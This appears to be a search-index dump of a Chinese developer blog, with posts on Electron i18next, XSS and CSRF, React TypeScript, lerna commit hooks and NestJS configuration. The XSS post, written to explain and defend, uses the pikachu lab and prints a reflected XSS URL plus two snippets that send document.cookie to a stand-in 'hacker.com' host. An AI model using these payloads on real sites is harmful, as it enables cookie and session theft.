&#125;`);&#125;;// 可访问全局作用域的白名单列表const access_white_list = [&quot;Math&quot;, &quot;Date&quot;];const Sandbox = (source: string, scope = &#123;&#125;) =&gt; &#123; const matched = source.match(ExpRE); if (!matched) return source; const code = matched[1]; // 执行上下文对象的代理对象 const scopeProxy = new Proxy(scope, &#123; has: (target, prop) =&gt; &#123; // has 可以拦截 with 代码块中任意属性的访问 if (access_white_list.includes(prop)) &#123; // 在可访问的白名单内，可继续向上查找 return target.hasOwnProperty(prop); &#125; if (!target.hasOwnProperty(prop)) &#123; throw new Error(`Invalid expression - $&#123;prop&#125;! You can not do that!`); &#125; return true; &#125;, &#125;); withedCode(code).call(scopeProxy, scopeProxy);&#125;;"},{"title":"Electron - 使用 i18next & react-i18next 进行国际化","path":"/2023/01/29/yuque/Electron - 使用 i18next & react-i18next 进行国际化/","content":"i18next 是社区中优秀的国际化框架，在 react 中广泛使用，我司的大量产品都使用 i18next 进行国际化，而 react-i18next 是 i18next 的一个扩展，提供了一些 HOC 及 hook 方便我们在 react 中使用 i18next。 由于 electron 是多进程机制，主进程和渲染进程都需要个 i18next 实例，但是多实例带来了一些问题，比如多实例的语言如何同步，文案如何集中管理？ 针对上面的两个问题，经过实践，我给出的解决方案如下： 主进程负责加载用户选择的语言和对应的文案 渲染进程通过进程通信从主进程的实例上获取初始化语言和文案初始化实例 用户在渲染进程切换语言，通过进程通信，主进程的 i18next 实例加载新语言的文案，并返回给渲染进程动态加载到渲染进程的实例中 整个流程大致如下： 主进程用户选择的系统语言保存在 electron-store 中，通过 getConfigStore方法获取上次用户选择的系统语言，默认为中文 123456789101112131415import Store from &quot;electron-store&quot;;export interface StoreState &#123; theme: string; config: NOTES.Config;&#125;export const getConfigStore = &lt;K extends keyof NOTES.Config&gt;(key: K) =&gt; &#123; return getStore&lt;NOTES.Config[K]&gt;(`config.$&#123;key&#125;`);&#125;;export const setConfigStore = (value: Partial&lt;NOTES.Config&gt;) =&gt; &#123; const config = getAllConfigStore(); return setStore(&quot;config&quot;, &#123; ...config, ...value &#125;);&#125;; i18next-fs-backend 是 i18next 的一个扩展，允许 Node.js 从本地文件系统中加载翻译 1234567891011121314151617import i18next from &quot;i18next&quot;;import i18nextBackend from &quot;i18next-fs-backend&quot;;import &#123; getConfigStore &#125; from &quot;./store&quot;;i18next.use(i18nextBackend).init(&#123; lng: getConfigStore(&quot;lang&quot;) || &quot;zh-CN&quot;, fallbackLng: &quot;en-US&quot;, backend: &#123; loadPath: path.join(__dirname, &quot;./i18n/&#123;&#123;lng&#125;&#125;.json&quot;), &#125;, interpolation: &#123; escapeValue: false, // react already safes from xss &#125;,&#125;);export default i18next; i18next 实例初始化后，通过 loadLanguages加载对应语言的文案，getResourceBundle获取语言的文案，通过这两个方法，渲染进程就可以共享主进程的文案，实现文案的集中管理。 12345678910111213141516171819202122232425262728293031import logger from &quot;electron-log&quot;;import i18next, &#123; LngOptions &#125; from &quot;../../utils/i18n&quot;;export const getI18nLanguages = () =&gt; &#123; return LngOptions;&#125;;export const getI18nInitResource = async () =&gt; &#123; const lng = i18next.language; const resource = await getI18nResource(lng); return &#123; lng, resource &#125;;&#125;;export const getI18nResource = async (lng: string) =&gt; &#123; await i18next.loadLanguages(lng).catch((err) =&gt; &#123; logger.error(err); &#125;); return i18next.getResourceBundle(lng, &quot;&quot;);&#125;;export const changeI18nLang = async (lng: string) =&gt; &#123; return new Promise&lt;boolean&gt;((resolve) =&gt; &#123; i18next.changeLanguage(lng, (err) =&gt; &#123; if (err) logger.error(err); resolve(!err); &#125;); &#125;);&#125;; 渲染进程invokeCommand同学 window 上挂载的变量和主进程双向通行 123456export const invokeCommand = &lt;T&gt;(type: string, payload = &#123;&#125;) =&gt; &#123; return window.api.invoke&lt;T&gt;(&quot;fromRenderer&quot;, &#123; type, payload, &#125;);&#125;; 渲染进程通过 invokeCommand 调用主进程的 getI18nInitResource 方法获取初始的语言和文案完成实例的初始化。用户切换语言时，同样通过进程通信获取新语言的文案，通过 i18next.addResourceBundle动态加载到实例中，调用 i18next.changeLanguage完成语言的切换。 1234567891011121314151617181920212223242526272829303132333435import i18next, &#123; ResourceKey &#125; from &quot;i18next&quot;;import &#123; initReactI18next &#125; from &quot;react-i18next&quot;;import &#123; invokeCommand &#125; from &quot;@/commands&quot;;export const initI18next = async () =&gt; &#123; const &#123; lng, resource &#125; = await invokeCommand&lt;&#123; lng: string; resource: ResourceKey; &#125;&gt;(&quot;getI18nInitResource&quot;); return i18next.use(initReactI18next).init(&#123; lng, resources: &#123; [lng]: &#123; translation: resource, &#125;, &#125;, interpolation: &#123; escapeValue: false, &#125;, &#125;);&#125;;export const changeLanguage = async (lng: string) =&gt; &#123; if (!i18next.hasResourceBundle(lng, &quot;translation&quot;)) &#123; // 动态加载语言 const resource = await invokeCommand&lt;ResourceKey&gt;(&quot;getI18nResource&quot;, lng); i18next.addResourceBundle(lng, &quot;translation&quot;, resource); &#125; return i18next.changeLanguage(lng);&#125;;export default i18next; 总结：electron 的多进程机制导致 i18next 不得不初始化出多个实例，但是我们同样可以利用进程通信，让一个实例加载文案，再同步到另一个实例，实现文案的集中管理。"},{"title":"XSS和CSRF的区别及防御","path":"/2022/03/08/XSS和CSRF的区别及防御/","content":"在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。 介绍之前，先上下维基百科： XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 XSS用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。 XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。 反射型反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面） 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它 pikachu，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html： 可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？ 脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。 现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。 1&lt;script src=\"http://hacker.com/hacker.js\"&gt;&lt;/script&gt; 123var img = new Image();img.src = \"http://hacker.com/hack.png?q=\" + document.cookie;document.body.append(img); 存储型存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。 反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。 比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。 这里还是用 pikachu 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本： 提交后并刷新页面，这段脚本被注入到 html 中，并执行了"},{"title":"在 React 项目中优雅地使用 Typescript","path":"/2021/04/19/在React项目中优雅地使用Typescript/","content":"TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。 「优雅」的含义： 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。 组件定义函数组件1234567891011121314151617import * as React from 'react';// 如果在tsconfig中设置了\"allowSyntheticDefaultImports\": true// 你还可以更精练地import react：// import React from \"react\";interface IProps { // CSSProperties提供样式声明的类型信息 // 用户传入style的时候就能够获得类型检查和代码补全 style?: React.CSSProperties; // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement onClick(event: React.MouseEvent&lt;HTMLButtonElement&gt;): void; // ...}const MyComponent: React.FC&lt;IProps&gt; = (props) =&gt; { const { children, ...restProps } = props; return &lt;div {...restProps}&gt;{children}&lt;/div&gt;;} FC是FunctionComponent的缩写。 IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认的React.ReactNode。 props无需做类型标注。 函数组件defaultProps（Deprecate）如果你需要定义defaultProps，那么不要使用React.FC，因为React.FC对defaultProps的支持不是很好： 1234567const defaultProps = { who: \"Johny Five\"};type IProps = { age: number } &amp; typeof defaultProps;export const Greet = (props: IProps) =&gt; { return &lt;div&gt;123&lt;/div&gt; };Greet.defaultProps = defaultProps; 事实上，一个提议在函数组件中废弃defaultProps的React rfc已经被接受，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要： 1const TestFunction: FunctionComponent&lt;Props&gt; = ({ foo = \"bar\" }) =&gt; &lt;div&gt;{foo}&lt;/div&gt; 类组件12345678910111213141516171819interface IProps { message: string;}interface IState { count: number;}export class MyComponent extends React.Component&lt;IProps, IState&gt; { state: IState = { // duplicate IState annotation for better type inference count: 0 }; render() { return ( &lt;div&gt; {this.props.message} {this.state.count} &lt;/div&gt; ); }} 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component&lt;IProps, IState&gt;有重复的嫌疑，但是这两者实际上是不同的： React.Component&lt;IProps, IState&gt;只是标注了基类的state属性类型。 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。 建议使用函数组件。 可渲染节点类型可渲染节点就是：可以直接被组件渲染函数返回的值。 与可渲染节点有关的类型定义如下（摘录自[@types/react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）： 12345type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends Array&lt;ReactNode&gt; {}type ReactFragment = {} | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; 组件类型 React.FC&lt;Props&gt;（即 React.FunctionComponent&lt;Props&gt;） React.Component&lt;Props, State&gt; React.ComponentType&lt;Props&gt;（即ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;） 在写HOC的时候经常用到。 123const withState = &lt;P extends WrappedComponentProps&gt;( WrappedComponent: React.ComponentType&lt;P&gt;,) =&gt; { ... 获取并扩展原生元素的props类型比如，以下例子获取并扩展了&lt;button&gt;的props类型： 123export const PrimaryButton = ( props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;) =&gt; &lt;Button size={ButtonSizes.default} {...props} /&gt;; PrimaryButton能够接受所有原生&lt;button&gt;所接受的props。关键在于React.HTMLProps。 获取并扩展第三方组件的props类型123456import { Button } from \"library\"; // but doesn't export ButtonProps! oh no!type ButtonProps = React.ComponentProps&lt;typeof Button&gt;; // no problem! grab your own!type AlertButtonProps = Omit&lt;ButtonProps, \"onClick\"&gt;; // modifyconst AlertButton: React.FC&lt;AlertButtonProps&gt; = props =&gt; ( &lt;Button onClick={() =&gt; alert(\"hello\")} {...props} /&gt;); 事件类型@types/react提供了各种事件的类型，比如以下是使用React.FormEvent的例子： 1234567891011121314151617181920class App extends React.Component&lt; {}, { text: string }&gt; { state = { text: '', } onChange = (e: React.FormEvent&lt;HTMLInputElement&gt;): void =&gt; { this.setState({ text: e.currentTarget.value }) } render() { return ( &lt;div&gt; &lt;input type=\"text\" value={this.state.text} onChange={this.onChange} /&gt; &lt;/div&gt; ) }} 在React中，所有事件（包括FormEvent、KeyboardEvent、MouseEvent等）都是SyntheticEvent的子类型。他们在@types/react中定义如下： 12345678910111213141516171819202122232425262728293031// DOM事件的基本属性都定义在这里interface BaseSyntheticEvent&lt;E = object, C = any, T = any&gt; { nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;}interface SyntheticEvent&lt;T = Element, E = Event&gt; extends BaseSyntheticEvent&lt;E, EventTarget &amp; T, EventTarget&gt; {}// 具体的事件类型：interface FormEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T&gt; {}interface KeyboardEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T, NativeKeyboardEvent&gt; { altKey: boolean; // ...}interface MouseEvent&lt;T = Element, E = NativeMouseEvent&gt; extends SyntheticEvent&lt;T, E&gt; { altKey: boolean; // ...}// ..."},{"title":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","path":"/2021/04/02/lerna项目中集成husky、lint-staged、commitlint和cz-customizable/","content":"Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。 说明重要package版本说明： “husky”: “^6.0.0” “lint-staged”: “^10.5.4” “@commitlint/cli”: “^12.0.1” “@commitlint/config-conventional”: “^12.0.1” “cz-customizable”: “^6.3.0” 配置husky在lerna项目根目录中安装husky: 1yarn add husky -D 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍 在package.json的scripts中添加\"prepare\": \"husky install\"，并运行这条命令： 1npm set-script prepare \"husky install\" &amp;&amp; npm run prepare 添加一个hook: 1npx husky add .husky/pre-commit \"npm test\" 上面这个命令会在.husky目录下新建一个pre-commit文件，其内容如下： 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"npm test 以上都是手动安装husky的过程，当然官方也提供了一键安装和配置脚本，推荐使用： 123npx husky-init &amp;&amp; npm install # npmnpx husky-init &amp;&amp; yarn # Yarn 1yarn dlx husky-init --yarn2 &amp;&amp; yarn # Yarn 2 如果使用的是v4版本的husky，想升级到v6，可以使用以下命名，一键迁移： 1234567891011121314// npmnpm install husky@6 --save-dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ &amp;&amp; yarn dlx husky-init --yarn2 \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config 更多配置，详见官方文档：https://typicode.github.io/husky/#/ 配置lint-staged在lerna项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录； 而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 lint-staged 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。 这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 lint-staged 就需要安装在任何一个需要做校验的子项目中。 添加或修改.husky目录下的pre-commit钩子如下： 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents 其中，precommit 是在pre-commit钩子中触发的子项目的命令 在子项目中安装和配置lint-staged，并添加precommit命令 安装lint-staged： 1lerna add lint-staged --scope=xxxx -D 在添加precommit命令： 1\"precommit\": \"lint-staged\" 配置lint-staged： 12345\"lint-staged\": { \"*.{ts,tsx,js,jsx}\": [ \"eslint\" ]}, 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme 配置commitlint和cz-customizable每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。 cz-customizable是一个帮助书写commit message的工具，而commitlint是一个校验commit message的工具。 安装commitlint和cz-customizable: 1yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D 添加commit-msg钩子 1npx husky add .husky/commit-msg \"yarn commitlint --edit\" 生成如下文件： 1234#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"yarn commitlint --edit 在package.json中添加以下配置： 123456789101112{ ... \"config\": { \"commitizen\": { \"path\": \"./node_modules/cz-customizable\" }, \"cz-customizable\": { \"config\": \"./.cz-config.js\" } }, ...} 在项目根目录中新建.cz-config.js文件，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051module.exports = { types: [ { value: 'feat', name: 'feat: A new feature' }, { value: 'fix', name: 'fix: A bug fix' }, { value: 'style', name: 'style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)', }, { value: 'refactor', name: 'refactor: A code change that neither fixes a bug nor adds a feature', }, { value: 'revert', name: 'revert: Revert to a commit' }, { value: 'chore', name: 'chore: Changes to the build process or auxiliary tools and libraries such as documentation generation', }, { value: 'docs', name: 'docs: Documentation only changes' }, { value: 'perf', name: 'perf: A code change that improves performance', }, { value: 'test', name: 'test: Adding missing tests' }, ], scopes: [ { name: 'frontend' }, { name: 'backend' }, { name: 'service' }, ], messages: { type: \"Select the type of change that you're committing:\", scope: \" Select the scope of change that you're committing:\", // used if allowCustomScopes is true customScope: 'Denote the custom scope:', subject: 'Write a SHORT, IMPERATIVE tense description of the change: ', body: 'Provide a LONGER description of the change (optional). Use \"|\" to break new line: ', breaking: 'List any BREAKING CHANGES (optional): ', footer: 'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: ', confirmCommit: 'Are you sure you want to proceed with the commit above?', }, allowCustomScopes: true,} 在项目根目录中新建.commitlintrc.js文件，内容如下： 1234567891011const typeEnum = require('./.cz-config');module.exports = { extends: ['@commitlint/config-conventional'], rules: { 'type-enum': [2, 'always', typeEnum.types.map((i) =&gt; i.value)], 'scope-enum': [2, 'always', typeEnum.scopes.map((i) =&gt; i.name)], 'scope-empty': [2, 'never'], },}; 配置完成后，每次提交commit时，可以使用git cz替换git commit命令，从而辅助我们更加规范的书写commit message。 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856 总结以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。 链接 husky官文文档 lint-staged官方文档 Cz工具集使用介绍"},{"title":"NestJS - 配置","path":"/2021/03/17/NestJS - 配置/","content":"应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。 在Node中，外部定义的环境变量通过procress.env全局可见。在Node.js应用程序中，通常使用.env文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。 解析.env文件并加载到procress.env中，就需要使用dotenv这个包了，但是Nest提供了一个配置环境变量的软件包 - @nestjs/config，其内部依赖了dotenv。 安装@nestjs/config12345// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config 简单使用安装完成后，我们可以导入ConfigModule。通常，我们将其导入根目录AppModule并使用. forRoot()静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的ConfigService类的选项ConfigModule。 1234567import { Module } from '@nestjs/common';import { ConfigModule } from '@nestjs/config';@Module({ imports: [ConfigModule.forRoot()],})export class AppModule {} 上面的代码将从.env默认位置（项目根目录）加载并解析文件，将文件中的键/值对.env与分配给其的环境变量合并process.env，并将结果存储在私有结构中，您可以通过访问该私有结构ConfigService。该forRoot()方法注册了ConfigService提供程序，该提供程序提供了get()一种读取这些已解析/合并的配置变量的方法。由于@nestjs/config依赖于dotenv，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在.env文件中同时存在时，运行时环境变量优先。 示例.env文件如下所示： 12DATABASE_USER=testDATABASE_PASSWORD=test 自定义ENV文件路径默认情况下，程序会在应用程序的根目录中查找.env文件。要为.env文件指定其他路径，请设置forRoot()的可选属性envFilePath，如下所示： 123ConfigModule.forRoot({ envFilePath: '.development.env',}); 您还可以为.env文件指定多个路径，如下所示： 123ConfigModule.forRoot({ envFilePath: ['.env.development.local', '.env.development'],}); 如果在多个文件中找到一个变量，则第一个优先。 在实际开发中，往往有多个配置文件，比如开发环境使用.development.env配置文件，测试环境使用.test.env配置文件，生产环境使用.production.env配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下： 1234567891011// package.json{ ... \"scripts\": { \"start\": \"cross-env NODE_ENV=development nest start\", \"start:dev\": \"cross-env NODE_ENV=development nest start --watch\", \"start:prod\": \"cross-env NODE_ENV=production node dist/main\", \"test\": \"cross-env NODE_ENV=test jest\", }, ...} 安装cross-env，使用它跨平台的设置环境变量 123ConfigModule.forRoot({ envFilePath: `${process.env.NODE_ENV || 'development'}.env`,}); 使用全局module如果要ConfigModule在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将options对象的isGlobal属性设置为true，将其声明为全局模块，如下所示。在这种情况下，一旦ConfigModule被加载到根模块中，就不需要在其他模块中导入ConfigModule了 123ConfigModule.forRoot({ isGlobal: true,}); 自定义配置文件对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。 自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。process.env对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如 1234567export default () =&gt; ({ port: parseInt(process.env.PORT, 10) || 3000, database: { host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 }}); 将其传给ConfigModule.forRoot()的load属性，来加载这个自定义配置： 12345678910import configuration from './config/configuration';@Module({ imports: [ ConfigModule.forRoot({ load: [configuration], }), ],})export class AppModule {} load属性是个数组，允许加载多个自定义配置文件 通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。 123456789101112http: host: 'localhost' port: 8080db: postgres: url: 'localhost' port: 5432 database: 'yaml-db' sqlite: database: 'sqlite.db' 为了读取和解析YAML文件，我们可以利用js-yaml包。 12$ npm i js-yaml$ npm i -D @types/js-yaml 安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。 1234567891011import { readFileSync } from 'fs';import * as yaml from 'js-yaml';import { join } from 'path';const YAML_CONFIG_FILENAME = 'config.yml';export default () =&gt; { return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), 'utf8'), );}; 使用ConfigService要从ConfigService中访问配置值，我们首先得注入ConfigService，和使用其他provider一样，我们需要将其加入@Module的imports属性中（如果将ConfigModule配置成全局module，则可以忽略这一步） 1234@Module({ imports: [ConfigModule], // ...}) 然后我们可以使用标准的构造函数注入: 123// import { ConfigService } from '@nestjs/config';constructor(private configService: ConfigService) {} 获取 12345// get an environment variableconst dbUser = this.configService.get&lt;string&gt;('DATABASE_USER');// get a custom configuration valueconst dbHost = this.configService.get&lt;string&gt;('database.host'); 如上所示，使用configService.get()方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，get&lt;string&gt;(…))。get()方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。 你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。 123456789interface DatabaseConfig { host: string; port: number;}const dbConfig = this.configService.get&lt;DatabaseConfig&gt;('database');// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示: 12// use \"localhost\" when \"database.host\" is not definedconst dbHost = this.configService.get&lt;string&gt;('database.host', 'localhost'); ConfigService有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下: 12345678910111213interface EnvironmentVariables { PORT: number; TIMEOUT: string;}// somewhere in the codeconstructor(private configService: ConfigService&lt;EnvironmentVariables&gt;) { // this is valid const port = this.configService.get&lt;number&gt;('PORT'); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.get&lt;string&gt;('URL');} 配置命名空间ConfigModule允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。 123456import { registerAs } from '@nestjs/config'; export default registerAs('database', () =&gt; ({ host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432})); 用forRoot()方法的参数对象的load属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。 12345678910import databaseConfig from './config/database.config';@Module({ imports: [ ConfigModule.forRoot({ load: [databaseConfig], }), ],})export class AppModule {} 现在，要从database命名空间中获取host，使用点操作符。使用database作为属性名的前缀，对应于命名空间的名称（作为 registerAs() 函数的第一个参数传递）。 1const dbHost = this.configService.get&lt;string&gt;('database.host'); 一个合理的选择是直接注入database命名空间。这使我们能够从强类型化中获益。 123456// import { ConfigType } from '@nestjs/config';constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigType&lt;typeof databaseConfig&gt;,) {} 缓存环境变量由于访问process.env会很慢，你可以设置传递给ConfigModule.forRoot()的options对象的cache属性，以提高ConfigService的性能。 123ConfigModule.forRoot({ cache: true,}); 部分注册到目前为止，我们已经用forRoot()方法处理了根模块(如AppModule)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。@nestjs/config包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用forFeature()静态方法来执行这个部分注册，如下所示。 123456import databaseConfig from './config/database.config';@Module({ imports: [ConfigModule.forFeature(databaseConfig)],})export class DatabaseModule {} 校验环境变量如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。@nestjsconfig包有两种不同的方式来实现这一点。 Joi内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。 一个自定义的validate()函数，它接受环境变量作为输入。 要使用Joi，我们必须安装Joi包: 1$ yarn add joi 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。 现在我们可以定义一个Joi验证模式，并通过forRoot()方法的选项对象的validationSchema属性传递，如下图所示。 123456789101112131415import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), }), ],})export class AppModule {} 默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 NODE_ENV和PORT设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 required() 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。 默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过forRoot()选项对象的validationOptions键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。 12345678910111213141516171819import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), validationOptions: { allowUnknown: false, abortEarly: true, }, }), ],})export class AppModule {} @nestjsconfig包使用的默认设置是: allowUnknown：控制是否允许在环境变量中使用未知键。默认为true。 abortEarly： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为false。 请注意，一旦你决定传递一个validationOptions对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是@nestjsconfig默认值）。例如，如果你在你的自定义validationOptions对象中没有指定allowUnknowns，它将有Joi默认值false。因此，在您的自定义对象中指定这两个设置可能是最安全的。 自定义校验函数另外，你也可以指定一个同步的validate函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。 